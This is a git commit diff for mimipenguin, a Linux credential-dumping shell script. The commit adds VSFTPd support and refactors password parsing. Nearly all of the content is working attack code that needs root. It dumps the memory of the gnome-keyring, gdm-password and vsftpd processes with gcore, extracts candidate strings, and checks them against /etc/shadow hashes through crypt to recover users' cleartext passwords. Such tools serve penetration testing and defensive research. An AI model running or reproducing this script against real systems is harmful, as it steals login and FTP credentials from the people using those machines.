2e51d47d08aaa25efd16a39ad1e5b2c566294b7b
huntergregal <huntergregal@gmail.com>
2017-03-31 13:04:57 -0400

    Added support for VSFTPd !!! :fire:

--- README.md
+++ README.md
@@ -4,18 +4,22 @@ A tool to dump the login password from the current linux desktop user. Adapted a
 
 # Details
 Takes advantage of the gnome login screen feature by dumping the memory of the process and extracting lines that have a high probability of containing the current user's cleartext password. Will attempt to calculate each word's probability by checking hashes in /etc/shadow.
+Added support for VSFTPD.
 
 # Requires
 * root permissions
 * Desktop envrionment (gnome)
+* Or VSFTPd with active connections
 
 # Supported/Tested
 * Kali 4.3.0 (rolling) x64
 * Ubuntu Desktop 12.04 LTS x64
 * Ubuntu Desktop 16.04 LTS x64
+* VSFTpd [NEW!]
 
 # Notes
 * Password moves in memory - still honing in on 100% effectiveness
 * Plan on expanding support and other credential locations
 * Working on expanding to non-desktop environments
+* Known bug - sometimes gcore hangs the script, this is a problem with gcore
 
--- mimipenguin.sh
+++ mimipenguin.sh
@@ -12,45 +12,27 @@ if [[ $EUID -ne 0 ]]; then
 	exit 1
 fi
 
-#If Kali
-if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
-	#get gdm-session-worker [pam/gdm-password] process
-	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
-	gcore -o /tmp/dump $PID >& /dev/null
-	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
-	SALT="$(echo $HASH | cut -d'$' -f 3)"
-	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
-	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
-fi
-
-#If Ubuntu
-if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
-	#get /usr/bin/gnome-keyring-daemon process
-	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
-	gcore -o /tmp/dump $PID >& /dev/null
-	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
-	SALT="$(echo $HASH | cut -d'$' -f 3)"
-	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
-fi
-
+parse_pass ()
+{
 #If hash not in dump get shadow hashes
-if [[ ! $HASH ]]; then
-	SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
+if [[ ! $2 ]]; then
+        SHADOWHASHES="$(cat /etc/shadow | cut -d':' -f 2 | egrep '^\$.\$')"
 fi
 
+#$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
 #Determine password potential for each word
 while read -r line; do
 	#If hash in dump, prepare crypt line
-	if [[ $HASH ]]; then
+	if [[ $2 ]]; then
 		#get ctype
-		CTYPE="$(echo $HASH | cut -c-3)"
+		CTYPE="$(echo $2 | cut -c-3)"
 		#Escape quotes to pass into crypt
 		SAFE="$(echo $line | sed 's/\"/\\"/g')"
-		CRYPT="\"$SAFE\", \"$CTYPE$SALT\""
-		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
+		CRYPT="\"$SAFE\", \"$CTYPE$3\""
+		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $2 ]]; then
 			#Find which user's password it is (useful if used more than once!)
-			USER="$(cat /etc/shadow | grep ${HASH} | cut -d':' -f 1)"
-			echo "$USER:$line"
+			USER="$(cat /etc/shadow | grep ${2} | cut -d':' -f 1)"
+			echo "$4			$USER:$line"
 		fi
 	#Else use shadow hashes
 	elif [[ $SHADOWHASHES ]]; then
@@ -63,42 +45,83 @@ while read -r line; do
 			if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $thishash ]]; then
 				#Find which user's password it is (useful if used more than once!)
 				USER="$(cat /etc/shadow | grep ${thishash} | cut -d':' -f 1)"
-				echo "$USER:$line"
+				echo "$4			$USER:$line"
 			fi
 		done <<< "$SHADOWHASHES"
 	#if no hash data - revert to checking probability
 	else
 		if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ ^LOGNAME= ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ UTF\-8 ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ ^splayManager[0-9]$ ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ ^gkr_system_authtok$ ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ Manager\.Worker ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ \/usr\/share ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ \/bin ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ \.so\.[0-1]$ ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ x86_64 ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ (aoao) ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		elif [[ $line =~ stuv ]]; then
-			echo "[LOW]			$line"
+			echo "[LOW]$4			$line"
 		else
-			echo "[HIGH]			$line"
+			echo "[HIGH]$4			$line"
 		fi
 	fi
-done <<< "$DUMP"
+done <<< "$1"
+}
+
+#If Kali
+if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
+        SOURCE="[SYSTEM - GNOME]"
+        #get gdm-session-worker [pam/gdm-password] process
+        PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+        gcore -o /tmp/dump $PID >& /dev/null
+        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
+        SALT="$(echo $HASH | cut -d'$' -f 3)"
+        DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
+        DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
+	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+fi
+
+#If Ubuntu
+if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
+        SOURCE="[SYSTEM - GNOME]"
+        #get /usr/bin/gnome-keyring-daemon process
+        PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
+        gcore -o /tmp/dump $PID >& /dev/null
+        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
+        SALT="$(echo $HASH | cut -d'$' -f 3)"
+        DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
+	parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+fi
+
+#If Vsftpd 
+if [[ -e "/etc/vsftpd.conf" ]]; then
+        SOURCE="[SYSTEM - VSFTPD]"
+        #get nobody /usr/sbin/vsftpd /etc/vsftpd.conf
+        PID="$(ps -eo pid,user,command | grep vsftpd | grep nobody | awk 'BEGIN {FS = " " } ; { print $1 }')"
+	#if exists aka someone logged into FTP then extract...
+	if [[ $PID ]]; then
+	        gcore -o /tmp/dump $PID >& /dev/null
+	        HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
+	        SALT="$(echo $HASH | cut -d'$' -f 3)"
+	        DUMP=$(strings "/tmp/dump.${PID}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+		parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+	fi
+fi
 
 #Cleanup
 rm -rf "/tmp/dump.${PID}"
